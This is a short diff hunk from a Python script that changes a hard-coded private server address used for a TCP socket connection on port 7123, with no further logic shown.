@@ -6,7 +6,7 @@ import platform
 import getpass
 import colorama
 
-SHOST = "192.168.2.153"
+SHOST = "172.31.176.1"
 SPORT = 7123
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
